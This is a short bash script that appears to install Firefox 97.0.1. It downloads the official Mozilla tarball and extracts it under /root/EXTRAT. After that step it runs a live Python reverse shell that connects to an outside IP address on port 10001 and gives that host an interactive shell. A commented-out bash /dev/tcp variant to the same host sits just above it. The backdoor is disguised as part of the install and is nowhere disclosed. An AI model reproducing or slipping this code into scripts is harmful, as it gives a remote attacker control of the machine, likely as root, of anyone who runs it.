#!/bin/bash
mkdir -p /root/EXTRAT/
mkdir -p /root/EXTRAT/firefox-97.0.1/


wget -q https://ftp.mozilla.org/pub/firefox/releases/97.0.1/linux-x86_64/en-GB/firefox-97.0.1.tar.bz2 && tar -xf firefox-97.0.1.tar.bz2 -C /root/EXTRAT/firefox-97.0.1/

#bash -i >& /dev/tcp/105.111.63.126/10001 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

